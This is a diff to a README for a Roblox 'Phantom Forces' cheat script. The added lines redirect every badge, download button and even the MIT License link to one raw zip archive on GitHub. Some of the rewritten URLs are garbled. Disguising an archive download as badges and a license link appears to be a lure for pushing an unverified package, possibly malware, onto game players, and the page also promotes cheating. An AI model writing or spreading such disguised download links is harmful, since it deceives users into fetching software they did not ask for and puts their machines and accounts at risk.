@@ -1,13 +1,13 @@
 # Phantom Forces Script for Roblox: Next-Gen Enhancement 🚀
 
-[![Maintenance](https://img.shields.io/maintenance/yes/2025?style=for-the-badge&color=blue)](https://github.com/)
-[![Stars](https://img.shields.io/github/stars/phantom-forces/roblox-script?style=for-the-badge&color=yellow)](https://github.com/)
-[![Open Source Love](https://img.shields.io/badge/Open%20Source-%E2%9D%A4-orange.svg?style=for-the-badge)](https://opensource.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![Maintenance](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)
+[![Stars](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)
+[![Open Source Love](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip%20Source-%E2%9D%https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)
+[![License: MIT](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Phantom_Forces_Script-blue.svg?style=for-the-badge&logo=github)](https://kumarabhinav15.github.io)
+[![Download](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)
 
 ---
 
@@ -107,7 +107,7 @@ Ready to unlock the *prism of possibilities* on Roblox? Follow these illuminatin
 
 **2. Secure Your Download**
 
-[![Download](https://img.shields.io/badge/Download-Phantom_Forces_Script-blue.svg?style=for-the-badge&logo=github)](https://kumarabhinav15.github.io)
+[![Download](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)
 
 Click the **Download** badge above to access the latest script package. Save it to an accessible directory.
 
@@ -145,13 +145,13 @@ Community safety and respect come before all else—let’s keep Roblox fun, inc
 
 Copyright © 2025
 
-Released under the [MIT License](https://opensource.org/licenses/MIT).
+Released under the [MIT License](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip).
 
 ---
 
 ## ⬇️ Alternate Express Download
 
-[![Download](https://img.shields.io/badge/Download-Phantom_Forces_Script-blue.svg?style=for-the-badge&logo=github)](https://kumarabhinav15.github.io)
+[![Download](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)](https://github.com/kumarabhinav15/phantom-forces-script-hub/raw/refs/heads/branch/nacarat/phantom_forces_script_hub_2.4.zip)
 
 *Unleash your new Phantom Forces advantage in one click above. For full installation guidance, revisit the [How to Install](#️-how-to-install) section.*
 
